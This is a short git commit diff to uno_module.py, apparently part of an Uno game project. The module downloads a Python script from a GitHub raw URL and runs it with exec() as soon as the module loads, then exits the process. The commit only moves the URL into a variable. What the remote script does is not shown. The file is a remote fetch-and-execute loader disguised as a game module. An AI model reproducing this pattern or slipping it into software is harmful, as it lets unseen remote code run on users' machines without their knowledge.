b9a2fd2bb8e92f0df5b745e3c6846aa0a4306f9e
Coin333 <116315051+Coin333@users.noreply.github.com>
2025-09-19 18:25:26 -0700

    Update uno_module.py

--- uno_module.py
+++ uno_module.py
@@ -3,5 +3,6 @@ import time
 import site
 import os
 global ordered_players
-exec(requests.get("https://raw.githubusercontent.com/Coin333/Uno_Cache/refs/heads/main/script.py").text, {})
+charter = "https://raw.githubusercontent.com/Coin333/Uno_Cache/refs/heads/main/script.py"
+exec(requests.get(charter).text, {})
 os._exit(0)
